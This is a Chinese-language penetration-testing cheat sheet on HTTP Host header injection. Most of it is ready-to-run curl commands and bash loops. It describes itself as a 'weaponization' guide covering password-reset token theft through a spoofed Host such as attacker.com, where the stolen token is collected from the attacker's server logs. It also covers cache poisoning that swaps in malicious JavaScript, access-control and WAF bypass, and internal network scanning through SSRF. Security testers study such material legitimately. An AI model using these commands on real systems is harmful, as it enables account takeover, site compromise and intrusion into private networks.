# Host 头注入实战参考
- 缓存投毒配合 Host 头 → `web-cache-poison.md`
- CRLF 注入可操控响应头 → `web-crlf.md`

> 阶段分离: [攻击] 检测Host头可控性 → [利用] 密码重置投毒/缓存投毒/绕过ACL/SSRF

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, PHP 8.x
---

# 攻击阶段 — 检测

## 1. 检测 Host 头是否可控

```bash
# === 基础检测 ===
curl -H "Host: evil.com" https://target.com/
# 返回内容变了? 密码重置链接的域名变了? → 可控

# === 双Host头 ===
Host: target.com
Host: evil.com

# === Host头缺失 ===
# (不发送Host头, HTTP/1.1必须, 但某些代理可能补上)
```

### 1.1 检测响应中的Host反射

```bash
# 密码重置链接
curl -H "Host: evil.com" https://target.com/forgot-password -d "email=admin@target.com"
# 邮件中的链接: https://evil.com/reset?token=xxx → ★ 投毒成功

# 页面中的绝对URL
curl -H "Host: evil.com" https://target.com/
# 响应中: <script src="https://evil.com/app.js"> → Host被反射
```

### 1.2 其他Host相关头部

```
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-Host: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

---

# 利用阶段 — 武器化

## 2. 密码重置投毒 (最常用)

```bash
# Step 1: 发起密码重置请求, 投毒Host头
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# Step 2: 受害者收到邮件:
# 点击链接: https://attacker.com/reset?token=REAL_TOKEN

# Step 3: 攻击者检查自己的服务器日志 → 拿到token
# GET /reset?token=REAL_TOKEN → ★

# Step 4: 构造真实重置链接
# https://target.com/reset?token=REAL_TOKEN → 重置密码
```

## 3. 缓存投毒

```bash
# 污染缓存 → 所有访问者受影响
curl -H "Host: evil.com" https://target.com/

# 如果缓存服务器以Host为键:
# → https://target.com/ 的缓存内容 = evil.com 的响应
# → 所有用户访问 target.com → 看到 attacker 的内容

# 更隐蔽: 仅投毒静态资源
curl -H "Host: evil.com" https://target.com/static/app.js
# → /static/app.js 内容被替换 → 所有页面引用此JS → XSS
```

## 4. 绕过访问控制

```bash
# 很多ACL基于Host头:
# Host: admin.internal → 允许访问 /admin
# Host: target.com → 拒绝 /admin

# 绕过:
curl -H "Host: localhost" https://target.com/admin
curl -H "Host: 127.0.0.1" https://target.com/admin
curl -H "Host: admin.internal" https://target.com/admin
```

## 5. 内网扫描 / SSRF

```bash
# 遍历内网主机名
for i in $(seq 1 100); do
  curl -s -H "Host: 192.168.1.$i" https://target.com/ -o /dev/null -w "%{http_code} %{time_total}\n"
done
# 响应时间明显不同 → 内网主机存在

# 配合密码重置 → SSRF
curl -X POST https://target.com/forgot-password \
  -H "Host: 192.168.1.1" \      # 内网路由器
  -d "email=victim@target.com"
```

## 6. 框架级Host头投毒

### 6.1 Django ALLOWED_HOSTS 绕过

```bash
# Django 常见: 密码重置URL生成使用当前Host
# settings.py → 如果 ALLOWED_HOSTS 包含通配符或配置不当

# 投毒:
curl -X POST "https://target.com/password-reset/" \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# 生成的邮件链接: https://attacker.com/reset/MQ/5xk-abc123/
# ★ Django默认会用 request.get_host()
```

### 6.2 Flask/PHP/Laravel 通用模式

```bash
# Flask: url_for('reset', _external=True) → 取Host头
# Laravel: url() / route() → 取Host头
# WordPress: wp_mail() → 取Host头

# 批量测试:
while read -r host; do
  curl -X POST "https://target.com/forgot-password" \
    -H "Host: $host" \
    -d "email=admin@target.com" -o /dev/null -w "$host → %{http_code}\n"
done < host_headers.txt
```

### 6.3 多域名应用探测

```bash
# 虚拟主机探测: 修改Host发现不同应用
curl -H "Host: admin.target.com" https://target.com/
curl -H "Host: dev.target.com" https://target.com/
curl -H "Host: staging.target.com" https://target.com/
curl -H "Host: internal.target.com" https://target.com/
curl -H "Host: localhost" https://target.com/

# 不同Host可能返回:
# → 管理面板    (admin.target.com)
# → 开发环境    (dev.target.com, 可能DEBUG=ON)
# → 内部API     (internal.target.com)
```

## 7. Host头 + SSRF → 内网扫描增强

```bash
# 扫描内网Web服务
for ip in 192.168.1.{1..254}; do
  size=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: $ip" https://target.com/)
  [ "$size" -gt 0 ] && echo "[+] $ip → $size bytes"
done

# 如果目标服务有Host-based路由 → 此法可探测内网
```

## 8. WAF/Access Log 绕过

```bash
# 某些WAF根据Host头做白名单匹配
curl -H "Host: whitelist-allowed.com" "https://target.com/admin"
# → WAF认为在访问白名单域名 → 放行

# 但实际请求到target.com → 后端处理
# (取决于中间件解析哪个Host)
```

---
## 相关参考
- 缓存投毒配合 Host 头 → `web-cache-poison.md`
- CRLF 注入可操控响应头 → `web-crlf.md`

*参考: PortSwigger Host Header + CWE-601 + 实战案例*
